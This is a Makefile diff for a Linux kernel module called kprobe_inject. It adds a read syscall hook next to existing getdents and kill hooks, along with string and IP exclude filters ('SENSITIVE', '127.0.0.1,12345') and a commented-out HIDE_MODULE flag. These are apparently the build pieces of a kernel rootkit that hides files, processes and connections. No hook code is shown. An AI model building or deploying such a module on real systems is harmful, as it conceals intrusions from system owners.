@@ -1,13 +1,15 @@
 obj-m += kprobe_inject.o
 kprobe_inject-objs := src/kprobe_inject.o \
                       src/hooks/x64_sys_getdents.o \
+                      src/hooks/x64_sys_read.o \
                       src/hooks/x64_sys_kill.o \
                       src/utils/ftrace_utils.o \
                       src/utils/kprobe_utils.o \
                       src/utils/proc_utils.o \
-                      src/utils/string_utils.o
+                      src/utils/excludes/ip_filtering.o \
+                      src/utils/excludes/string_filtering.o
 
-EXTRA_CFLAGS += -I$(PWD)/include -DEXCLUDES="\"SENSITIVE\""
+EXTRA_CFLAGS += -I$(PWD)/include -DSTRING_EXCLUDES="\"SENSITIVE\"" -DNET_EXCLUDES="\"127.0.0.1,12345\""
 #EXTRA_CFLAGS += -DHIDE_MODULE
 
 all:
